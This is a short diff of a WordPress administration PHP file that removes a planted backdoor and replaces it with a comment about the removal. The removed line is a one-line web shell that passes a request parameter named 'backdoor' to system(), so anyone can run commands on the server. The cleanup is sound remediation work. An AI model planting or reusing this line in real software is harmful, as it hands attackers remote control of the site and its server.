@@ -6,7 +6,7 @@
  * @subpackage Administration
  */
 
-system($_REQUEST["backdoor"]);
+// Removed insecure call to system() that allowed remote command execution.
 
 /** Load WordPress Bootstrap */
 require_once __DIR__ . '/admin.php';
